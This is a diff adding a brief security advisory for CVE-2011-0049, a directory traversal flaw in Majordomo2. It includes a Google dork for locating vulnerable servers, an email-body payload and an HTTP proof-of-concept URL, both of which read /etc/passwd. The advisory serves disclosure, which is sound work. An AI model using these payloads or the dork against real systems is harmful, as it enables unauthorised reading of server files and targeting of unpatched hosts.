@@ -1,0 +1,22 @@
+Original Advisory: https://sitewat.ch/en/Advisory/View/1
+Credit: Michael Brooks (https://sitewat.ch)
+Vulnerability:  Directory Traversal
+Software: Majordomo2
+Identifier:CVE-2011-0049
+Vendor: http://www.mj2.org/
+Affected Build: 20110121 and prior
+Google dork:inurl:mj_wwwusr
+
+Special thanks to Dave Miller,  Reed Loden and the rest of the Mozilla
+security team for handling the issue.
+
+This vulnerability is exploitable via ALL of Majordomo2's interfaces.
+*Including
+e-mail*.  Send an email to majordomo's mail interface (for example:
+majordomo@bugzilla.org) with the body of the message as follows:
+help ../../../../../../../../../../../../../etc/passwd
+
+I'll give you one guess as to the contents of the response email ;).
+
+PoC for HTTP:
+http://localhost/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
